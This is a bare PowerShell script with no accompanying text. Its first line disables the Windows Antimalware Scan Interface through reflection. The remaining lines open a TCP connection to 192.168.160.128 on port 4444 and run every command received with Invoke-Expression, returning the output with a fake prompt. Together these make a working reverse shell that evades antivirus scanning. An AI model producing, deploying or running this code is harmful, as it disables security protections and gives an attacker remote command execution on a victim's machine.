[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$k = "192.168.160.128"; $p = 4444;
$client = New-Object Net.Sockets.TCPClient($k, $p);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | %{0};
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $cmd = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $output = (Invoke-Expression $cmd 2>&1 | Out-String);
    $prompt = $output + "PS " + (Get-Location).Path + "> ";
    $response = [Text.Encoding]::ASCII.GetBytes($prompt);
    $stream.Write($response, 0, $response.Length);
    $stream.Flush();
}
$client.Close();

